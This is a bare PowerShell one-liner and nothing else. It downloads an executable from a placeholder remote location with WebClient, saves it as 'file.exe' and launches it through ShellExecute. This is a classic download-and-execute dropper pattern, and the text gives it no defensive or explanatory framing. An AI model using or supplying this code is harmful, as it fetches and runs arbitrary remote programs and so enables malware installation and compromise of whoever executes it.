 $down = New-Object System.Net.WebClient; $url = 'domain\path\file'; $file = 'file.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;
